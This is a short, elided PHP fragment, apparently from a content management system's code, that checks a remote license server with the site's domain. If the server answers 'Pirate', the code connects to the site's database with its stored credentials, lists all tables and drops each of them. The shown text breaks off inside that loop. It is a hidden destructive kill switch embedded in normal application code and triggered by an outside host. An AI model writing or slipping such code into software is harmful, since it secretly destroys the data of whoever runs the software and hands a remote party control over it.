   ...
   */
	...
	*/
	...
	if ($_SERVER['PHP_SELF'] == 'index.php') {
        $temp_xyz = @file_get_contents('http://license.faberhost.com/module/license/license-cmsfaber.php?domain='.$_SERVER["HTTP_HOST"]);
        if ($temp_xyz == 'Pirate') {
            $temp_link = @mysql_connect('localhost', $conf["db_username"], $conf["db_password"]);
            $sql = "SHOW TABLES FROM ".$conf["db_database"];
            ...
            foreach($found_tables as $table_name) {
                $sql = "DROP TABLE IF EXISTS ".$conf["db_database"].".".$table_name;
